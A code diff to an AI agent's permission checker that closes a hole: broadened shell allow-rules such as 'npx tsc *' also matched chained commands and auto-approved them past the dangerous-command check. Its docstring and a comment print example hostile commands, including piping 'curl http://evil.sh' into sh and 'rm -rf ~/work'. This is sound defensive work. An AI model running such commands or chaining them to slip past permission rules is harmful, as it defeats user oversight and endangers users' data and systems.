@@ -36,6 +36,7 @@ from typing import Literal, Optional
 from pydantic import BaseModel
 
 from ..tools.base import AdkCcTool
+from .broadening import _split_compound
 from .command_safety import classify_command, command_paths
 from .modes import PermissionMode
 from .protected import classify_path
@@ -77,6 +78,69 @@ def _first_match(
         if r.behavior is behavior and rule_matches(
             r, tool_name, args, workspace_root
         ):
+            return r
+    return None
+
+
+def _bash_allow_match(
+    rules: list[PermissionRule],
+    args: dict,
+    workspace_root: Optional[str] = None,
+) -> Optional[PermissionRule]:
+    """ALLOW match for `run_bash`, evaluated PER SEGMENT.
+
+    A rule is matched against the whole command string by fnmatch, and `*` spans
+    `&&`, `;` and `|`. So the broadened rule an "Allow always" writes for
+    `npx tsc --noEmit` — `npx tsc *` — also matched
+    `npx tsc --noEmit && curl http://evil.sh | sh` and
+    `npx tsc --noEmit; rm -rf ~/work`. Because an ALLOW rule overrides the
+    dangerous-command floor (Steps 1c/1e), those were auto-approved: one grant on
+    a typecheck became arbitrary command execution behind that prefix.
+    (User-reported symptom was the opposite complaint — repeated prompts — which
+    is what led here.)
+
+    So every segment must be covered by some ALLOW rule. A whole-command rule
+    still works: it matches each segment only if the user really did grant the
+    whole compound, and the literal rule stored alongside covers that case
+    exactly. Appending anything ungranted now falls through to the normal floor.
+    """
+    command = str((args or {}).get("command") or "")
+    segments = [seg for seg, _sep in _split_compound(command)] if command else []
+    if len(segments) <= 1:
+        return _first_match(rules, RuleBehavior.ALLOW, "run_bash", args, workspace_root)
+
+    matched: Optional[PermissionRule] = None
+    for seg in segments:
+        hit = _first_match(
+            rules, RuleBehavior.ALLOW, "run_bash", {"command": seg}, workspace_root
+        )
+        if hit is None:
+            # …unless the user granted this exact compound, or an operator
+            # granted everything. Deliberately NOT "any rule that fnmatches the
+            # whole string": the broadened `npx tsc *` matches
+            # `npx tsc --noEmit && curl evil | sh` as a whole too, which is the
+            # hole being closed.
+            return _whole_command_rule(rules, args, workspace_root)
+        matched = matched or hit
+    return matched
+
+
+def _whole_command_rule(
+    rules: list[PermissionRule], args: dict, workspace_root: Optional[str]
+) -> Optional[PermissionRule]:
+    """A rule that authorises this command AS A WHOLE.
+
+    Only two shapes qualify: an EXACT literal (the rule written alongside every
+    broadened one, so re-running the same compound stays one click) and an
+    operator rule with no content or a bare `*` (an explicit "allow anything"
+    decision, not something an Allow-always click can produce). A broadened
+    prefix pattern must not qualify — that is precisely the escalation.
+    """
+    command = str((args or {}).get("command") or "")
+    for r in rules:
+        if r.behavior is not RuleBehavior.ALLOW or r.tool_name not in ("run_bash", "*"):
+            continue
+        if r.rule_content is None or r.rule_content == "*" or r.rule_content == command:
             return r
     return None
 
@@ -262,7 +326,11 @@ def _decide_impl(
     # Pre-compute allow/ask matches — the command floor (Steps 1c/1d/1e) and the
     # later ask/destructive steps consult them: an operator ALLOW rule overrides
     # dangerous/catastrophic; a user ASK rule overrides the read-only auto-allow.
-    allow = _first_match(rules, RuleBehavior.ALLOW, tool_name, args, workspace_root)
+    allow = (
+        _bash_allow_match(rules, args, workspace_root)
+        if tool_name == "run_bash"
+        else _first_match(rules, RuleBehavior.ALLOW, tool_name, args, workspace_root)
+    )
     ask = _first_match(rules, RuleBehavior.ASK, tool_name, args, workspace_root)
 
     # Step 1c: catastrophic command — hard deny before the bypass short-circuit
